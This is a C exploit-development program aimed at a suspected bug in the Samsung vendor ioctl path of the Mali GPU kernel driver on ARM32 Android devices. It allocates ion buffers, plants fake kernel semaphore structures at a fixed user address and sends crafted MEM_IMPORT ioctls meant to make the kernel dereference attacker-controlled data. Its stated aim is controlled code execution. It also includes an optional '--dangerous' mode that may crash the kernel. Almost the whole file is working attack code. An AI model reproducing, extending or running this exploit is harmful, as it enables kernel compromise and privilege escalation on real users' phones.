/*
 * mali_exploit_controlled.c — Controlled Mali vendor dispatch exploitation
 *
 * KEY INSIGHT: Samsung vendor dispatch (magic 0x80) treats phandle differently:
 *   - Standard path (magic 'M'): phandle = user pointer to fd → copy_from_user
 *   - Vendor path (magic 0x80): phandle = raw fd → fget(phandle) → then BUG: 
 *     dereferences phandle (or phandle.sizer high bits) as a kernel/user pointer
 *
 * Crash: down() → _raw_spin_lock_irqsave on invalid semaphore address
 *
 * EXPLOITATION HYPOTHESIS:
 *   - The Samsung code uses the FULL 64-bit phandle.sizer value
 *   - On ARM32, low 32 bits = fd for fget(), high 32 bits or combined = pointer
 *   - If we set high 32 bits to a mapped user address with a fake semaphore:
 *     * fget(low_32) succeeds (valid fd)
 *     * Kernel dereferences high_32 as struct ptr
 *     * down(&fake_sem) at our mapped page → SUCCEEDS (not crash!)
 *     * Function continues with our controlled data
 *
 * TESTS (all in forked children with alarm):
 *   A: Standard import via 'M' magic as control (safe)
 *   B: Vendor import with phandle=0 (safe, NULL check)
 *   C: Vendor import with high bits = mapped addr, low = valid fd
 *   D: Vendor import with ONLY high bits set, low = 0 (no valid fd → should be safe)
 *   E: Vendor import with low = valid fd, high = unmapped addr (should crash)
 *   F: If C works: controlled code execution via fake vtable/function ptr
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/resource.h>

struct uk_header { uint32_t id; uint32_t ret; };

static int make_cmd(int magic, int sz) {
    return _IOC(3, magic, 0, sz);
}

static int mali_handshake(int fd) {
    /* Use standard magic for handshake (always works) */
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header *)hb)->id = 0; /* VERSION_CHECK */
    hb[8] = 10;
    if (ioctl(fd, make_cmd(0x80, 16), hb) < 0) return -1;
    memset(hb, 0, 16);
    ((struct uk_header *)hb)->id = 530; /* SET_FLAGS */
    if (ioctl(fd, make_cmd(0x80, 16), hb) < 0) return -1;
    return 0;
}

static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;
    struct { uint64_t len, align; uint32_t heap, flags; int32_t fd; }
        d = {4096, 4096, 1, 0, -1};
    int r = ioctl(ion, 0xc0144900, &d);
    close(ion);
    return (r == 0 && d.fd >= 0) ? d.fd : -1;
}

/* Fill a page with valid semaphore structs at every 16-byte alignment.
 * ARM32 struct semaphore: { raw_spinlock_t lock, unsigned count, struct list_head wait_list }
 *   lock: 4 bytes (0 = unlocked)
 *   count: 4 bytes (1 = available, down() succeeds immediately)
 *   wait_list.next: 4 bytes (self-pointer)
 *   wait_list.prev: 4 bytes (self-pointer)
 * Total: 16 bytes per semaphore
 */
static void fill_fake_semaphores(void *base, uint32_t base_addr, size_t len) {
    for (uint32_t off = 0; off < len; off += 16) {
        uint32_t *p = (uint32_t *)((char *)base + off);
        p[0] = 0;                      /* lock = unlocked */
        p[1] = 1;                      /* count = 1 (available) */
        p[2] = base_addr + off + 8;    /* wait_list.next = &wait_list */
        p[3] = base_addr + off + 8;    /* wait_list.prev = &wait_list */
    }
}

/* Check if any semaphore was modified (count decremented, list changed) */
static int check_semaphore_mods(void *base, uint32_t base_addr, size_t len) {
    int mods = 0;
    for (uint32_t off = 0; off < len; off += 16) {
        uint32_t *p = (uint32_t *)((char *)base + off);
        if (p[0] != 0 || p[1] != 1 ||
            p[2] != (base_addr + off + 8) ||
            p[3] != (base_addr + off + 8)) {
            if (mods < 5)
                fprintf(stderr, "    MOD@%x: lock=%x count=%u next=%x prev=%x\n",
                        base_addr + off, p[0], p[1], p[2], p[3]);
            mods++;
        }
    }
    return mods;
}

typedef struct {
    int survived;       /* 1=OK, SIG if killed */
    int ioctl_ret;
    int ioctl_errno;
    uint32_t hdr_id;    /* response header.id */
    uint32_t hdr_ret;   /* response header.ret */
    int sem_mods;       /* semaphore modifications detected */
    uint8_t out_buf[48]; /* full response buffer */
    char note[128];
} result_t;

static void report(const char *name, result_t *r) {
    fprintf(stderr, "  %-45s ", name);
    if (r->survived == 1) {
        fprintf(stderr, "OK ioctl=%d e=%d hdr=[%u,%u] sem_mods=%d",
                r->ioctl_ret, r->ioctl_errno, r->hdr_id, r->hdr_ret, r->sem_mods);
    } else if (r->survived < -100) {
        fprintf(stderr, "SIG%d", -(r->survived + 100));
    } else {
        fprintf(stderr, "ERR%d", r->survived);
    }
    if (r->note[0]) fprintf(stderr, " [%s]", r->note);
    fprintf(stderr, "\n");
}

/* Run a test function in a forked child */
static void run_in_child(void (*fn)(result_t *), result_t *res) {
    int pipefd[2];
    pipe(pipefd);

    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        alarm(8);
        result_t r = {0};
        fn(&r);
        write(pipefd[1], &r, sizeof(r));
        close(pipefd[1]);
        _exit(0);
    }

    close(pipefd[1]);
    int status;
    waitpid(pid, &status, 0);
    memset(res, 0, sizeof(*res));
    read(pipefd[0], res, sizeof(*res));
    close(pipefd[0]);
    if (WIFSIGNALED(status))
        res->survived = -(100 + WTERMSIG(status));
}

/* ============================================================ */
/* TEST A: Standard import control (safe, magic 'M')            */
/* ============================================================ */
static void test_A(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);
    int dma_fd = ion_alloc_fd();
    if (dma_fd < 0) { r->survived = -2; close(fd); return; }

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;              /* MEM_IMPORT */
    *(uint32_t *)(buf + 8) = (uintptr_t)&dma_fd; /* ptr to fd (correct) */
    *(uint32_t *)(buf + 16) = 2;               /* UMM */
    *(uint64_t *)(buf + 24) = 0x4000000F;      /* flags: IMPORT + RW */

    r->ioctl_ret = ioctl(fd, make_cmd('M', 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    memcpy(r->out_buf, buf, 48);
    r->survived = 1;
    close(dma_fd);
    close(fd);
}

/* ============================================================ */
/* TEST B: Vendor import, phandle=0 (safe, NULL check)          */
/* ============================================================ */
static void test_B(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;  /* MEM_IMPORT */
    /* phandle = 0 (all bytes zero) */
    *(uint32_t *)(buf + 16) = 1;   /* type */

    r->ioctl_ret = ioctl(fd, make_cmd(0x80, 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    memcpy(r->out_buf, buf, 48);
    r->survived = 1;
    close(fd);
}

/* ============================================================ */
/* TEST C: Vendor import, low=valid_fd, high=mapped_addr        */
/* THIS IS THE KEY TEST: does the kernel use high 32 bits?      */
/* ============================================================ */
static void test_C(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);
    int dma_fd = ion_alloc_fd();
    if (dma_fd < 0) { r->survived = -2; close(fd); return; }

    /* Map fake struct page at 0x100000 */
    uint32_t fake_addr = 0x100000;
    void *fake = mmap((void *)(uintptr_t)(fake_addr & ~0xFFF), 0x10000,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (fake == MAP_FAILED) {
        snprintf(r->note, sizeof(r->note), "mmap failed");
        r->survived = -3;
        close(dma_fd); close(fd);
        return;
    }
    fill_fake_semaphores(fake, fake_addr & ~0xFFF, 0x10000);

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;         /* MEM_IMPORT */
    *(uint32_t *)(buf + 8) = dma_fd;      /* phandle low = valid fd */
    *(uint32_t *)(buf + 12) = fake_addr;  /* phandle high = mapped addr */
    *(uint32_t *)(buf + 16) = 1;          /* type */

    snprintf(r->note, sizeof(r->note), "low=%d high=0x%x", dma_fd, fake_addr);

    r->ioctl_ret = ioctl(fd, make_cmd(0x80, 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    memcpy(r->out_buf, buf, 48);
    r->survived = 1;
    r->sem_mods = check_semaphore_mods(fake, fake_addr & ~0xFFF, 0x10000);
    munmap(fake, 0x10000);
    close(dma_fd);
    close(fd);
}

/* ============================================================ */
/* TEST D: Vendor import, low=0 (invalid fd), high=mapped_addr  */
/* Should NOT crash (fget(0) might succeed for stdin, but       */
/* phandle low=0 might hit NULL check in Samsung code)          */
/* ============================================================ */
static void test_D(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);

    uint32_t fake_addr = 0x100000;
    void *fake = mmap((void *)(uintptr_t)(fake_addr & ~0xFFF), 0x10000,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (fake == MAP_FAILED) { r->survived = -3; close(fd); return; }
    fill_fake_semaphores(fake, fake_addr & ~0xFFF, 0x10000);

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;
    *(uint32_t *)(buf + 8) = 0;           /* phandle low = 0 */
    *(uint32_t *)(buf + 12) = fake_addr;  /* phandle high = mapped addr */
    *(uint32_t *)(buf + 16) = 1;

    r->ioctl_ret = ioctl(fd, make_cmd(0x80, 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    r->survived = 1;
    r->sem_mods = check_semaphore_mods(fake, fake_addr & ~0xFFF, 0x10000);
    munmap(fake, 0x10000);
    close(fd);
}

/* ============================================================ */
/* TEST E: Standard import via vendor magic (0x80) with correct */
/* pointer-to-fd phandle — does vendor magic affect std import? */
/* ============================================================ */
static void test_E(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);
    int dma_fd = ion_alloc_fd();
    if (dma_fd < 0) { r->survived = -2; close(fd); return; }

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;                 /* MEM_IMPORT */
    *(uint64_t *)(buf + 8) = (uintptr_t)&dma_fd;  /* pointer to fd (correct) */
    *(uint32_t *)(buf + 16) = 2;                   /* UMM */
    *(uint64_t *)(buf + 24) = 0x4000000F;          /* flags */

    r->ioctl_ret = ioctl(fd, make_cmd(0x80, 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    memcpy(r->out_buf, buf, 48);
    r->survived = 1;
    close(dma_fd);
    close(fd);
}

/* ============================================================ */
/* TEST F: Vendor import raw fd + type=1 (original mali_import) */
/* THIS SHOULD TRIGGER THE BUG — dangerous!                    */
/* Only run if specifically requested via argv                   */
/* ============================================================ */
static void test_F(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);
    int dma_fd = ion_alloc_fd();
    if (dma_fd < 0) { r->survived = -2; close(fd); return; }

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;
    *(uint64_t *)(buf + 8) = (uint64_t)dma_fd; /* raw fd as phandle */
    *(uint64_t *)(buf + 16) = 1;                /* type */

    snprintf(r->note, sizeof(r->note), "raw_fd=%d", dma_fd);
    r->ioctl_ret = ioctl(fd, make_cmd(0x80, 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    memcpy(r->out_buf, buf, 48);
    r->survived = 1;
    close(dma_fd);
    close(fd);
}

/* ============================================================ */
/* TEST G: Vendor import raw fd + type=2 (UMM variant)          */
/* ============================================================ */
static void test_G(result_t *r) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { r->survived = -1; return; }
    mali_handshake(fd);
    int dma_fd = ion_alloc_fd();
    if (dma_fd < 0) { r->survived = -2; close(fd); return; }

    uint8_t buf[48] = {0};
    *(uint32_t *)(buf + 0) = 513;
    *(uint64_t *)(buf + 8) = (uint64_t)dma_fd; /* raw fd as phandle */
    *(uint32_t *)(buf + 16) = 2;                /* type = UMM */

    snprintf(r->note, sizeof(r->note), "raw_fd=%d type2");
    r->ioctl_ret = ioctl(fd, make_cmd(0x80, 48), buf);
    r->ioctl_errno = errno;
    r->hdr_id = *(uint32_t *)(buf + 0);
    r->hdr_ret = *(uint32_t *)(buf + 4);
    memcpy(r->out_buf, buf, 48);
    r->survived = 1;
    close(dma_fd);
    close(fd);
}

/* Hex dump of buffer */
static void hexdump(const char *label, uint8_t *buf, int len) {
    fprintf(stderr, "    %s:", label);
    for (int i = 0; i < len; i++) {
        if (i % 16 == 0 && i > 0) fprintf(stderr, "\n    %*s", (int)strlen(label)+1, "");
        fprintf(stderr, " %02x", buf[i]);
    }
    fprintf(stderr, "\n");
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Vendor Dispatch Controlled Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int run_dangerous = 0;
    if (argc >= 2 && strcmp(argv[1], "--dangerous") == 0)
        run_dangerous = 1;

    result_t r;

    /* Safe tests first */
    fprintf(stderr, "--- SAFE TESTS ---\n");

    run_in_child(test_A, &r);
    report("A: std import 'M' (ptr-to-fd, control)", &r);
    if (r.survived == 1) hexdump("response", r.out_buf, 48);

    run_in_child(test_B, &r);
    report("B: vendor import 0x80 phandle=0", &r);

    run_in_child(test_E, &r);
    report("E: vendor 0x80 with ptr-to-fd (correct)", &r);
    if (r.survived == 1) hexdump("response", r.out_buf, 48);

    run_in_child(test_D, &r);
    report("D: vendor low=0 high=mapped", &r);

    /* Key exploitation test */
    fprintf(stderr, "\n--- EXPLOITATION TEST ---\n");
    run_in_child(test_C, &r);
    report("C: vendor low=valid_fd high=mapped_sem", &r);
    if (r.survived == 1) hexdump("response", r.out_buf, 48);

    if (run_dangerous) {
        fprintf(stderr, "\n--- DANGEROUS TESTS (may crash kernel!) ---\n");

        run_in_child(test_G, &r);
        report("G: vendor raw_fd type=2", &r);

        run_in_child(test_F, &r);
        report("F: vendor raw_fd type=1 (CRASH?)", &r);
    } else {
        fprintf(stderr, "\n--- Skipping dangerous tests (use --dangerous) ---\n");
    }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
